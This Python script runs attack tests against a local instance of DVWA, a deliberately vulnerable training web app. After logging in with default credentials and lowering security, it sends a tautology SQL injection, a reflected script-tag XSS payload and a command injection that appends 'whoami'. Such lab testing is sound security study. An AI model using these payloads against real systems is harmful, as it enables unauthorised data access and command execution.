#!/usr/bin/env python3
"""Detailed DVWA vulnerability testing with proper CSRF handling"""
import requests
from bs4 import BeautifulSoup
import re

DVWA_URL = "http://localhost:8080"

print("="*80)
print("DETAILED DVWA VULNERABILITY TESTING")
print("="*80)

# Login
print("\n[1] Logging in...")
session = requests.Session()

# First GET login page to get CSRF token
response = session.get(f"{DVWA_URL}/login.php")
soup = BeautifulSoup(response.text, 'html.parser')
user_token = soup.find('input', {'name': 'user_token'})
user_token_value = user_token['value'] if user_token else None
print(f"  CSRF token: {user_token_value[:20] if user_token_value else 'Not found'}...")

# POST with credentials and CSRF token
response = session.post(f"{DVWA_URL}/login.php", data={
    'username': 'admin',
    'password': 'password',
    'Login': 'Login',
    'user_token': user_token_value
}, allow_redirects=True)
print(f"✓ Logged in, session: {session.cookies.get('PHPSESSID')}")
print(f"  Final URL: {response.url}")

# Check if actually logged in
if 'logout' in response.text.lower() or 'welcome' in response.text.lower():
    print("  ✓ Login successful!")
else:
    print("  ✗ Login failed")
    exit(1)

# Set security low
# First GET the security page to extract CSRF token
response = session.get(f"{DVWA_URL}/security.php")
soup = BeautifulSoup(response.text, 'html.parser')
security_token = soup.find('input', {'name': 'user_token'})
security_token_value = security_token['value'] if security_token else None

# Now POST with CSRF token
response = session.post(f"{DVWA_URL}/security.php", data={
    'security': 'low',
    'seclev_submit': 'Submit',
    'user_token': security_token_value
})
print(f"✓ Security set to low (cookies: {session.cookies.get('security')})")

# Test SQLi - Normal
print("\n[2] Testing SQL Injection - Normal (id=1)...")
# First GET the form to extract CSRF token
response = session.get(f"{DVWA_URL}/vulnerabilities/sqli/")
soup = BeautifulSoup(response.text, 'html.parser')
sqli_token = soup.find('input', {'name': 'user_token'})
sqli_token_value = sqli_token['value'] if sqli_token else None
print(f"  SQLi form CSRF token: {sqli_token_value[:20] if sqli_token_value else 'Not found'}...")

# Now submit with CSRF token
response = session.get(f"{DVWA_URL}/vulnerabilities/sqli/", params={
    'id': '1',
    'Submit': 'Submit',
    'user_token': sqli_token_value
})

if 'First name' in response.text:
    # Save for debugging
    with open('/tmp/sqli_normal_response.html', 'w') as f:
        f.write(response.text)

    # Try multiple regex patterns
    matches = re.findall(r'First name: (.*?)<br.*?>Surname: (.*?)<br', response.text, re.IGNORECASE | re.DOTALL)
    if not matches:
        matches = re.findall(r'First name:\s*(.*?)<br[^>]*>Surname:\s*(.*?)<br', response.text, re.IGNORECASE)
    if not matches:
        matches = re.findall(r'First name:\s*(.*?)\s*<br', response.text, re.IGNORECASE)

    print(f"✓ SQLi query works! Found {len(matches)} results:")
    if len(matches) > 0:
        for item in matches[:5]:
            if isinstance(item, tuple):
                print(f"    {item}")
            else:
                print(f"    {item}")

    # Show excerpt with First name
    excerpt_match = re.search(r'(.{100}First name.{100})', response.text, re.DOTALL | re.IGNORECASE)
    if excerpt_match:
        print(f"  Excerpt: {excerpt_match.group(1)[:200]}")
else:
    print("✗ No 'First name' found")
    if 'CSRF token is incorrect' in response.text:
        print("  Error: CSRF token incorrect")

# Test SQLi - Attack
print("\n[3] Testing SQL Injection - Attack (id=1' OR '1'='1)...")
# At security level low, no CSRF token needed
response = session.get(f"{DVWA_URL}/vulnerabilities/sqli/", params={
    'id': "1' OR '1'='1",
    'Submit': 'Submit'
})

# Extract from ALL <pre> blocks
pre_blocks = re.findall(r'<pre>(.*?)</pre>', response.text, re.DOTALL)
if pre_blocks:
    # Combine all pre blocks
    all_pre_content = '\n'.join(pre_blocks)
    user_count = all_pre_content.count('First name:')
    if user_count > 1:
        print(f"✓ ✓ ✓ SQLi ATTACK WORKS! Found {user_count} users")
        # Extract user names from all blocks
        users = re.findall(r'First name: (.*?)<br', all_pre_content, re.IGNORECASE)
        for user in users[:5]:
            print(f"    {user.strip()}")
    else:
        print(f"✗ SQLi attack returned only {user_count} user (expected multiple)")
        print(f"    Response excerpt: {all_pre_content[:200]}")
else:
    print("✗ SQLi attack failed - no <pre> blocks found")

# Test XSS
print("\n[4] Testing XSS Reflected...")
payload = '<script>alert(1)</script>'
response = session.get(f"{DVWA_URL}/vulnerabilities/xss_r/", params={
    'name': payload
})

if payload in response.text:
    print("✓ ✓ ✓ XSS WORKS! Payload reflected unencoded")
    # Show context from h1 tag
    match = re.search(r'<h1>(.{0,50}' + re.escape(payload) + r'.{0,50})</h1>', response.text)
    if match:
        print(f"    Context: {match.group(1)[:100]}")
    else:
        # Fallback: show any context
        match = re.search(r'(.{30}' + re.escape(payload) + r'.{30})', response.text)
        if match:
            print(f"    Context: {match.group(1)}")
elif '&lt;script&gt;' in response.text:
    print("✗ XSS payload was HTML-encoded (not vulnerable)")
    print("    Found: &lt;script&gt;alert(1)&lt;/script&gt;")
else:
    print("✗ XSS payload not reflected at all")

# Test Command Injection
print("\n[5] Testing Command Injection...")
response = session.post(f"{DVWA_URL}/vulnerabilities/exec/", data={
    'ip': '127.0.0.1; whoami',
    'Submit': 'Submit'
})

# Extract from <pre> block
pre_match = re.search(r'<pre>(.*?)</pre>', response.text, re.DOTALL)
if pre_match:
    output = pre_match.group(1).strip()
    # Check if whoami command executed (should show www-data or root)
    if 'www-data' in output or 'root' in output:
        print("✓ ✓ ✓ Command Injection WORKS!")
        # Show command output lines
        lines = output.split('\n')
        for line in lines[:10]:
            if line.strip():
                print(f"    {line.strip()}")
    else:
        print("✗ Command injection failed - no user output found")
        print(f"    Response: {output[:200]}")
else:
    print("✗ Command injection failed - no <pre> block found")

print("\n" + "="*80)
print("TESTING COMPLETE")
print("="*80)
